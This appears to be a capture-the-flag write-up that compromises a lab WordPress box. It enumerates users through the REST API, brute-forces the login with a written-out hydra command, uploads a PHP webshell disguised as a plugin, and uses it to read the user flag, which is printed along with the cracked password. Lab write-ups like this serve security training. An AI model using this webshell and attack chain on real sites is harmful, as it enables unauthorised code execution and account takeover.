# Write-up : "The Very Best"

**Target:** 10.10.0.X (vhost `viridiancity.epi`, the IP changes on every redeploy)

**Objective:** Get user.txt

**Difficulty:** Medium

**Date:** 18/09/2026

**Techniques used:** Web reconnaissance, WordPress user enumeration (REST API), OSINT on the site's content, targeted brute force, RCE via WordPress plugin upload

**Tools used:** nmap, curl, jq, hydra, python3, zip

---

## 1. Network reconnaissance (Nmap)

```bash
nmap -sV 10.10.0.X
```
**Result:**
- `22/tcp`: SSH (OpenSSH)
- `80/tcp`: HTTP (Apache 2.4.68), a WordPress 7.0

The site uses the hostname `viridiancity.epi`, we add it to `/etc/hosts` (otherwise internal links and the API don't respond correctly):

```bash
echo "10.10.0.X viridiancity.epi" | sudo tee -a /etc/hosts
```

**Vulnerability (config):** mandatory virtual host. Without the correct `Host` header, we land on the default site.

---

## 2. WordPress user enumeration (REST API)

```bash
curl -s http://viridiancity.epi/index.php/wp-json/wp/v2/users
```
**Result:** a single account, `ash` (the slug is the login).

**Vulnerability exploited:** information leak via the WordPress REST API (CWE-200). The `wp-json/wp/v2/users` endpoint exposes authors without authentication.

---

## 3. Hint about the password (content OSINT)

While reading the "About Viridian" page, we find the city's password convention:

> "the password is the Pokémon's species name written entirely in lowercase, followed immediately by two digits."

So the password = a Pokémon name in lowercase followed by 2 digits.
Viridian City is in the Kanto region, so the Pokémon is one of the 151 from Gen 1.

**Vulnerability exploited:** weak and predictable password policy (CWE-521).

---

## 4. Targeted brute force of the `ash` login

We generate the list `pokemon_name + 00 to 99` (151 x 100 = 15,100 attempts), then:

```bash
hydra -l ash -P poke.txt -t 4 viridiancity.epi http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=login_error'
```
- `-t 4` = few threads: a fragile box crashes its database if hammered (and then returns false positives).
- `F=login_error` = a failure contains `login_error` in the response.

**Result:** `ash : kakuna67`

Reliable detection: a real success returns a 302 redirect to `/wp-admin`, not just the absence of `login_error`.

---

## 5. From admin access to RCE (plugin upload)

The theme editor (`theme-editor.php`) is blocked by WordPress's "loopback" security check: after editing, WP tries to contact itself to check for a fatal error; on an isolated box this test fails and the edit is reverted.

We work around this via uploading a plugin containing a webshell (the zip's files are extracted into `wp-content/plugins/` without even activating it):

```php
<?php
/* Plugin Name: ShellX */
if(isset($_GET['c'])){ system($_GET['c']); }
```

We zip it (`shellx/shellx.php`) and send it via Plugins then Add New then Upload (or via a POST on `update.php?action=upload-plugin` with the nonce).

**Vulnerability exploited:** arbitrary plugin upload leading to code execution (CWE-434, RCE).

Verification:

```bash
curl "http://viridiancity.epi/wp-content/plugins/shellx/shellx.php?c=id"
# uid=33(www-data)
```

---

## 6. Retrieving the flag

```bash
curl "http://viridiancity.epi/wp-content/plugins/shellx/shellx.php?c=cat+/home/ash/user.txt"
```

**FLAG obtained:**

```
EPI{4sH_1s_M4yB3_Th3_V3ry_B3st}
```

---

## Summary of exploited vulnerabilities

| # | Vulnerability | Category (CWE) |
| --- | --- | --- |
| 1 | User enumeration via the WordPress REST API | CWE-200 |
| 2 | Weak/predictable password convention | CWE-521 |
| 3 | No anti-brute-force on `wp-login.php` | CWE-307 |
| 4 | Arbitrary plugin upload (RCE) | CWE-434 / CWE-94 |

---

## Summary of steps

1. `wp-json/wp/v2/users`: login `ash`.
2. "About Viridian" page: Pokémon convention + 2 digits (Kanto = Gen 1).
3. Targeted brute force (hydra, 15100 combos): `ash:kakuna67`.
4. wp-admin, theme editor blocked (loopback), upload a webshell plugin.
5. `?c=` parameter, RCE as www-data, `cat /home/ash/user.txt`, the flag.

---

## Conclusion

- **Initial access:** API enumeration (`ash`) and an OSINT hint from the About page (Pokémon password convention).
- **Admin access:** targeted and throttled brute force, `ash:kakuna67`.
- **RCE:** bypassing the theme editor block via uploading a webshell plugin.
- **User flag:** `EPI{4sH_1s_M4yB3_Th3_V3ry_B3st}`

Lessons: read the site's content (the password hint was there), target the brute force (convention and Kanto theme), don't hammer a fragile box (false positives when the DB crashes), and detect success from the 302 redirect rather than the absence of `login_error`.
